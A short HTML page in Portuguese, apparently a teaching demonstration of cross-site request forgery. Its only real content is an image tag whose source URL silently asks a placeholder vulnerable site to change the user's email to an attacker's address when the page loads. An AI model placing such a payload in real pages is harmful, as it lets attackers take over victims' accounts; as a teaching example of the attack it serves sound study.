<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Demonstração</title>
</head>
<body>
    <h1>CSRF via Image</h1>
    <p>Este exemplo demonstra como uma requisição CSRF pode ser enviada ao carregar uma imagem.</p>
    <!-- A URL maliciosa é usada como fonte da imagem -->
    <img src="http://site-vulneravel.com/alterar-email?novo_email=hacker@exemplo.com">
</body>
</html>
